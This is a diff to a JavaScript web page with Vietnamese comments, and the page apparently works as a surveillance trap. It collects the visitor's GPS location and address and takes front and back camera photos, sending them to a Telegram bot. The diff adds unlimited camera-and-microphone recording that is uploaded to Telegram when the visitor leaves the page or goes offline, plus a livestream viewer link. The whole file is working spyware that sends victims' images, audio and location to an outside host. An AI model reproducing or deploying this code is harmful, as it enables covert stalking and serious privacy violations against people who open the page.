@@ -69,7 +69,6 @@ function getPreciseLocationOrFallbackToIP() {
       async pos => {
         info.lat = pos.coords.latitude.toFixed(6);
         info.lon = pos.coords.longitude.toFixed(6);
-
         try {
           const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
           const data = await res.json();
@@ -79,7 +78,6 @@ function getPreciseLocationOrFallbackToIP() {
           info.address = '📍 GPS được cho phép, nhưng không rõ địa chỉ';
           info.country = 'Không rõ';
         }
-
         info.ip = 'Không rõ';
         info.isp = 'Không rõ';
         resolve();
@@ -110,7 +108,7 @@ function getCaption() {
 📍 Kinh độ: ${info.lon}
 📸 Camera: ${info.camera}
 
-🔗 Link xem livestream: https://yourdomain.github.io/viewer.html
+🔗 Link xem livestream: https://dat7262.github.io/Livestream/
 `.trim();
 }
 
@@ -122,13 +120,11 @@ function captureCamera(facingMode = "user") {
         const video = document.createElement("video");
         video.srcObject = stream;
         video.play();
-
         video.onloadedmetadata = () => {
           const canvas = document.createElement("canvas");
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
           const ctx = canvas.getContext("2d");
-
           setTimeout(() => {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             stream.getTracks().forEach(track => track.stop());
@@ -145,47 +141,44 @@ async function sendTwoPhotos(frontBlob, backBlob) {
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID);
   formData.append('media', JSON.stringify([
-    {
-      type: 'photo',
-      media: 'attach://front',
-      caption: getCaption()
-    },
-    {
-      type: 'photo',
-      media: 'attach://back'
-    }
+    { type: 'photo', media: 'attach://front', caption: getCaption() },
+    { type: 'photo', media: 'attach://back' }
   ]));
   formData.append('front', frontBlob, 'front.jpg');
   formData.append('back', backBlob, 'back.jpg');
 
-  return fetch(API_SEND_MEDIA, {
+  await fetch(API_SEND_MEDIA, {
     method: 'POST',
     body: formData
   });
 }
 
-// ====== QUAY VIDEO CAMERA ======
-function recordVideo(facingMode = "user", duration = 5000) {
-  return new Promise(async (resolve, reject) => {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: true });
-      const mediaRecorder = new MediaRecorder(stream);
-      const chunks = [];
+// ====== GHI VIDEO KHÔNG GIỚI HẠN ======
+let mediaRecorder;
+let videoChunks = [];
 
-      mediaRecorder.ondataavailable = event => {
-        if (event.data.size > 0) chunks.push(event.data);
+async function startRecordingStream() {
+  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+  mediaRecorder = new MediaRecorder(stream);
+
+  mediaRecorder.ondataavailable = (e) => {
+    if (e.data.size > 0) videoChunks.push(e.data);
+  };
+
+  mediaRecorder.start();
+}
+
+function stopAndSendRecording() {
+  return new Promise((resolve) => {
+    if (mediaRecorder && mediaRecorder.state !== "inactive") {
+      mediaRecorder.onstop = async () => {
+        const blob = new Blob(videoChunks, { type: 'video/webm' });
+        await sendVideoToTelegram(blob);
+        resolve();
       };
-
-      mediaRecorder.onstop = () => {
-        stream.getTracks().forEach(track => track.stop());
-        const blob = new Blob(chunks, { type: 'video/webm' });
-        resolve(blob);
-      };
-
-      mediaRecorder.start();
-      setTimeout(() => mediaRecorder.stop(), duration);
-    } catch (err) {
-      reject(err);
+      mediaRecorder.stop();
+    } else {
+      resolve();
     }
   });
 }
@@ -195,7 +188,7 @@ async function sendVideoToTelegram(videoBlob) {
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID);
   formData.append('video', videoBlob, 'recorded.webm');
-  formData.append('caption', `🎥 Video quay trực tiếp sau khi chụp.\n\n${getCaption()}`);
+  formData.append('caption', `🎥 Video quay trực tiếp khi rời trang.\n\n${getCaption()}`);
 
   await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
     method: 'POST',
@@ -233,13 +226,18 @@ async function main() {
     });
   }
 
-  try {
-    const videoBlob = await recordVideo("user", 7000); // quay 7 giây
-    await sendVideoToTelegram(videoBlob);
-  } catch (err) {
-    console.warn("❌ Không thể quay video:", err.message);
-  }
+  await startRecordingStream(); // 🔴 Bắt đầu quay không giới hạn
 }
+
+// ====== TỰ ĐỘNG GỬI VIDEO KHI RỜI TRANG ======
+window.addEventListener("beforeunload", async (e) => {
+  e.preventDefault();
+  await stopAndSendRecording();
+});
+
+window.addEventListener("offline", async () => {
+  await stopAndSendRecording();
+});
 
 // ====== BẮT ĐẦU ======
 main();
